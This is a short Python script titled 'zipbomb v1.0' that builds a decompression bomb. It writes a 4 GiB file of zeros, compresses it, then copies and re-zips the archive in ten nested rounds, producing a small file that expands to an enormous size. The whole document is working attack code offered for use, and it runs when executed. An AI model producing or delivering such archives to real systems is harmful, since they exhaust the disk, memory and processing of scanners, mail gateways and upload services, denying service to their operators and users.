# -------------------------
# zipbomb v1.0
# Charlie Harris
# -------------------------

import zipfile
import shutil
import os

def createzipbomb():

    file = open("0.txt", 'w+')
    for i in range(4096):
        file.write("0" * 1024 * 1024)
    file.close()

    zf = zipfile.ZipFile("z.zip", mode = 'w', allowZip64=True)
    zf.write("0.txt", compress_type = zipfile.ZIP_DEFLATED)
    zf.close()

    os.remove("0.txt")

    for i in range(10):
        copyzips()
        zipzips()

def copyzips():

    for i in range(10):
        f = "z" + str(i) + ".zip"
        shutil.copy("z.zip", f)
        i += 1

    os.remove("z.zip")

def zipzips():

    zz = zipfile.ZipFile("z.zip", mode = 'w', allowZip64=True)
    for i in range(10):
        zz.write("z" + str(i) + ".zip", compress_type = zipfile.ZIP_DEFLATED)
    zz.close()
    for i in range(10):
        os.remove("z" + str(i) + ".zip")

createzipbomb()
